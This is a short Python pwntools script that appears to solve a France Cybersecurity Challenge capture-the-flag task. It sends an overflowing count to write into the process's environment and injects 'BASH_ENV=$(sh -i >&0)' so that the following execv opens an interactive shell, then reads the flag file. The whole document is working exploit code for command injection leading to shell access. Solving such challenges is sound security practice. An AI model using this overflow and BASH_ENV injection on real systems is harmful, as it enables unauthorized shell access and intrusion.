#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = remote('challenges.france-cybersecurity-challenge.fr', 2105)

count_overflow = lambda n: ((-n & 0xffffffffffffffff) // 0x8 - 2)

offset = 0x1b0 # &envp[0]

r.sendline(str(count_overflow(offset)).encode())

# https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection#bash_env
r.sendline(b'BASH_ENV=$(sh -i >&0)')
r.sendline(b'') # Exit the loop and call execv

r.recvuntil(b'2]:')

r.sendline(b'id && cat flag.txt')

r.interactive()
